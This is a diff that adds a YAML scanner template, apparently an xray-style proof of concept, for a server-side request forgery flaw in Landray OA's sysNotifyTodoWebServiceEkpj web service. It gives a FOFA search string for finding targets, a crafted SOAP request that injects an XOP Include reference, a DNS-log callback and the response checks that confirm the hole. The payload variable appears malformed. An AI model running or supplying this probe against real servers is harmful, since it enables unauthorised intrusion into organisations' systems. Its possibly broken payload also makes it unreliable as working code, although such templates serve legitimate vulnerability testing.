@@ -1,0 +1,32 @@
+id: poc-yaml-landray-sysnotifytodowebserviceekpj-ssrf
+info:
+  name: 蓝凌OA sysNotifyTodoWebServiceEkpj SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: landray
+  fofa: app="Landray-OA系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  payload: 'file:///
+
+    "http://" + str(domain)
+
+    '
+requests:
+- method: POST
+  path: /sys/webservice/sysNotifyTodoWebServiceEkpj
+  headers:
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+  data: "------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n\
+    <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"http://ekpj.webservice.notify.sys.kmss.landray.com/\">\n<soapenv:Header/>\n\
+    <soapenv:Body>\n    <web:getAllTodoId>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n\
+    \            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\
+    \ href=\"{{.payload}}\"/></count>\n        </arg0>\n    </web:getAllTodoId>\n\
+    </soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--"
+  expression: (contains(body,"意外的文本") && reverse.Verify()) || (contains(body,"意外的文本")
+    && contains(content_type,"text/xml"))
+transport: http
